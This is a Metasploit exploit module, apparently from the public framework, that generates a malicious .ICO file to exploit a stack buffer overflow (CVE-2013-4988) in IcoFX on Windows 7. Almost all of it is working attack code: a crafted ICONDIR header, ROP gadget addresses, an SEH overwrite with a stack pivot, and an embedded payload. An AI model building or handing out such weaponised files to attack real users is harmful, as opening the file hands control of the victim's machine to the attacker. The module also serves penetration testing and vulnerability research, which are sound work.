##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'IcoFX Stack Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack-based buffer overflow vulnerability in version 2.1
        of IcoFX. The vulnerability exists while parsing .ICO files, where an specially
        crafted ICONDIR header, providing an arbitrary long number of images into the file,
        can be used to trigger the overflow when reading the ICONDIRENTRY structures.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Marcos Accossatto', # Vulnerability discovery, poc
          'juan vazquez' # Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2013-4988' ],
          [ 'OSVDB', '100826' ],
          [ 'BID', '64221' ],
          [ 'EDB', '30208'],
          [ 'URL', 'http://www.coresecurity.com/advisories/icofx-buffer-overflow-vulnerability' ]
        ],
      'Platform'          => [ 'win' ],
      'Payload'           =>
        {
          'DisableNops'    => true,
          'Space'          => 864,
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'Targets'        =>
        [
          [ 'IcoFX 2.5 / Windows 7 SP1',
            {
              :callback => :target_win7,
            }
          ],
        ],
      'DisclosureDate' => 'Dec 10 2013',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'The output file name.', 'msf.ico'])
      ], self.class)

  end

  def target_win7
    # All the gadgets com from IcoFX2.exe 2.5.0.0

    # ICONDIR structure
    ico =  [0].pack("v") # Reserved. Must always be 0
    ico << [1].pack("v") # Image type: 1 for icon (.ico) image
    # 0x66 is enough to overwrite the local variables and, finally
    # the seh handler. 0x7f00 is used to trigger an exception after
    # the overflow, while the overwritten SEH handler is in use.
    ico << [0x7f00].pack("v")
    # ICONDIRENTRY structures 102 structures are using to overwrite
    # every structure = 16 bytes
    # 100 structures are used to reach the local variables
    ico << rand_text(652)
    ico << [0x0044729d].pack("V") * 20 # ret # rop nops are used to allow code execution with the different opening methods
    ico << [0x0045cc21].pack("V")      # jmp esp
    ico << payload.encoded
    ico << rand_text(
      1600 -                 # 1600 = 16 ICONDIRENTRY struct size * 100
      652 -                  # padding to align the stack pivot
      80 -                   # rop nops size
      4 -                    # jmp esp pointer size
      payload.encoded.length
    )
    # The next ICONDIRENTRY allows to overwrite the interesting local variables
    # on the stack
    ico << [2].pack("V")          # Counter (remaining bytes) saved on the stack
    ico << rand_text(8)           # Padding
    ico << [0xfffffffe].pack("V") # Index to the dst buffer saved on the stack, allows to point to the SEH handler
    # The next ICONDIRENTRY allows to overwrite the seh handler
    ico << [0x00447296].pack("V") # Stackpivot: add esp, 0x800 # pop ebx # ret
    ico << rand_text(0xc) # padding
    return ico
  end

  def exploit
    unless self.respond_to?(target[:callback])
      fail_with(Failure::BadConfig, "Invalid target specified: no callback function defined")
    end

    ico = self.send(target[:callback])

    print_status("Creating '#{datastore['FILENAME']}' file...")
    file_create(ico)
  end

end
